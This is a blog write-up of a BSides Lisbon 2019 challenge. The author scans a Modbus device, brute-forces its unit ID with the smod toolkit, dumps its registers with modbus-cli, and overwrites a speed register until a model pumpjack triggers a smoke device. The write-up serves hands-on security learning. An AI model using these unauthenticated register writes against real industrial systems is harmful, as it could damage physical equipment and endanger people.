---
layout: post
title:  "Make it smoke! Cisco Challenge Write-up"
categories: [infosec, iot]
tags: [bsideslisbon, infosec, iot, cisco]
thumbnail: /images/bsideslx19/final.png
description: "Write-up of a sidequest challenge by Cisco/Talos during BSidesLisbon 2019"
---

[BSides Lisbon](https://bsideslisbon.org/) is the biggest security dedicated event in Portugal, with two days of talks, workshops, a CTF competition, and lots more. During BSides, some *sidequests* ranging from raffles to challenges appear that can give you prizes*!* This is a write-up of one of those challenges by Cisco/Talos.

<!--more-->

## The Challenge

![Make it Smoke!](/images/bsideslx19/header.png)

In the booth of Cisco/Talos, we were presented with the following scenario (as it can be seen in the picture):
1. An access point (AP) named `security` with the password `cisco12345`.
2. A 3d-printed pumpjack[^1].
3. Some controlling system based on Arduino.
4. The objective was to make it smoke somehow.

## Preliminaries

First thing first, connect to the network and do a quick network and port scan. Since it was an AP for everyone that wanted to do the challenge, several IP's showed up, but only one interesting, the `10.10.10.1` with the port `502` open.

As per Siemens documentation: *By default, the protocol uses Port `502` as local port in the Modbus server*[^2]. Thus we are probably faced with something that speaks *Modbus* protocol.

With a little of search, you can find a lot of *Modbus* protocol clients in the wild, as well as some *offensive* toolkits. 

## Making it smoke!

Using the [smod-1 by theralfbrown](https://github.com/theralfbrown/smod-1) toolkit, I was able to connect to the Modbus system and interact with it. 

{% highlight bash %}
$ python smod.py
SMOD > use modbus/scanner/uid
SMOD modbus(uid) > set RHOST 10.10.10.1
SMOD modbus(uid) > exploit
[+] Module Brute Force UID Start
[+] Start Brute Force UID on : 10.10.10.1
[+] UID on 10.10.10.1 is : 10
{% endhighlight %}

Now I did know the UID of the Modbus, however even after exploring the DoS capabilities and *all* the reader modules I was not getting anywhere close to make it smoke.

So, after exploring a little more one Github, I found out this really nice [modbus-cli by tallakt](https://github.com/tallakt/modbus-cli).

Even if it was not implemented with an *offensive* mindset like the previous tool, it allowed us to read, write and **dump** the memory of a *Modbus* device. Using it, we were able to read random parts of the memory, *e.g.*, reading five words from the device starting from address `%MW100` (which corresponds to address `400101`).

{% highlight bash %}
$ modbus read 10.10.10.1 %MW100 5
%MW100 0
%MW101 0
%MW102 0
%MW103 0
%MW104 0
{% endhighlight %}

After trying to read random places of the memory using this tool and finding nothing but zero values, and decided to just *dump* everything into a file (the operation took around 20 seconds).

{% highlight bash %}
$ modbus read --output mybackup.yml 10.10.10.1 400001 1000
{% endhighlight %}

After dumping all the memory into a file, looking into the file:

{% highlight bash %}
$ cat mybackup.yml 
---
:host: 10.10.10.1
:port: 502
:slave: 1
:offset: '400001'
:data:
- 0
- 0
- 0
- 0
- 0
- 0
- 5000
- 0
-- show more --
{% endhighlight %}

The file keeps going on, with a lot of zero's and a lot of random values. I guess that those random values were the result of all the participants trying to *pwn* it. 

However, that seventh value caught my attention because it was a single round number. Maybe that was the speed of the rotation mechanism of the pumpjack, *maybe*.

Checking if the dump was correct, with the same tool we could read that specific part of the memory:

{% highlight bash %}
$ modbus read 10.10.10.1 400001 7
400001 0
400002 0
400003 0
400004 0
400005 0
400006 0
400007 8000
{% endhighlight %}

And yep, the value was still there, but a bit higher (and we could observe the pumpjack rotating more quickly).

So the next step was to try to write some higher value there:

{% highlight bash %}
$ modbus write 10.10.10.1 400007 10000
{% endhighlight %}

And then, *higher*:

{% highlight bash %}
$ modbus write 10.10.10.1 400007 18000
{% endhighlight %}

And this was it, the increase in the rotation speed of the pumpjack triggered the smoke device that was connected to the Arduino! 

![Running like hell!](/images/bsideslx19/final.png)

This was my first time playing around with *Modbus*, and there is still a lot that I didn't touch nor understood. Nonetheless, it was a nice kickstart. 

Props to Cisco and Talos for coming up with the challenge and for the coffee mug and the [*snort*](https://www.snort.org/). And *pwning* IoT is the best kind of *pwn*.


### References

[^1]: [Pumpjack on Wikipedia](https://en.wikipedia.org/wiki/Pumpjack)
[^2]: [Which ports are released for Modbus/TCP communication](https://support.industry.siemens.com/cs/document/34010717/which-ports-are-released-for-modbus-tcp-communication-and-how-many-modbus-clients-can-communicate-with-a-simatic-s7-pn-cpu-as-modbus-server-?dti=0&lc=en-WW)
